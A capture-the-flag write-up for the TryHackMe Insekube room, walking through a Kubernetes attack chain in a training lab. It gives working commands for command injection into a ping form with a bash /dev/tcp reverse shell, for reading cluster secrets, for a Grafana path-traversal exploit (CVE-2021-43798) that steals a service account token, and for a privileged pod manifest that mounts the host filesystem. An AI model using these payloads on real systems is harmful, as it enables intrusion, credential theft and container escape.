# TryHackMe Insekube Writeup

This is a great room from TryHackMe! You can find it at https://tryhackme.com/room/insekube

## task 1

from attackbox:
```bash
nmap {target IP}
```

## task 2

Go to web page on target on port 80. Input is passed to a shell with ping prefixed.

```bash
127.0.0.1; {your command here}
# netcat is not installed on target

# on attack box star a listener
nc -lvnp 9999

# on target web page
127.0.0.1; bash -i >& /dev/tcp/{attack box IP}/9999 0>&1

# for shell convenience
export TERM=xterm-256color

printenv # to get all env vars (could also do remotely but we need a rev shell later)
```

## task 3

kubectl is in `/tmp`

alias if you want: `alias kubectl="/tmp/kubectl"` or just stay in /tmp and invoke kubectl with `./kubectl`

`kubectl auth can-i --list`

notice you can get and list secrets 🤔

## task 4

list secrets, then get secrets

```bash
kubectl get secrets

kubectl describe secret secretflag

kubectl get secret secretflag -o 'json'
```

```json
{
    "apiVersion": "v1",
    "data": {
        "flag": "{REDACTED}="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"{REDACTED}=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-01-06T23:41:19Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "562",
        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
    },
    "type": "Opaque"
}
```
decode the base64 flag

`echo "{REDACTED}=" | base64 -d`

flag: `flag{REDACTED}`

## task 5

view environment variables on a node to recon what's on the cluster

`env`

notice the grafana service and port

curl grafana, notice there is a login page

curl the login page, notice the version number

`curl http://grafana:3000/login`

grep for "Grafana v"

version is 8.3.0-beta2

read through https://www.exploit-db.com/exploits/50581 to get the path of the LFI, don't need to actually run this python code

CVE-2021-43798

## task 6

assumes you used the CVE to grab the k8s service token grafana is using, as described in this blog:
https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/

setting the token with:
```bash
export token=$(curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token)
```

then use the token with `kubectl` like this:
```bash
kubectl auth can-i --list --token=${token}
```

now we have `*` verbs on `*.*` verbs! that's kubernetes admin permissions

check the name of the service account token we have
```bash
kubectl get serviceaccount --token=${token}
```

get the name of the grafana pod (`kubectl get pods --token=${token}`)

exec into the grafana pod with
```bash
kubectl exec -it grafana-57454c95cb-v4nrk --token=${token} -- /bin/bash
```

get environment variables for a flag

## task 7

here we need to get a .yaml file on the system

there are no text editors, so we have to copy/paste it in

note: the host is offline but the maintainers were kind enough to put a copy of `ubuntu` on the machine, just have to add an image pull policy to use the old copy

```bash
cat <<EOF >>privesc.yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
EOF
kubectl apply -f privesc.yml --token=${token}
```
that launches the pod and attaches the host filesystem to it

verify it's there  with `kubectl get pods --token=${token}`

exec into it `kubectl exec -it everything-allowed-exec-pod --token=${token} -- /bin/bash`

now you're in the root of the malicious pod

cd into the filesystem of th host `cd /host`

find flag at `/host/root/flag.txt`
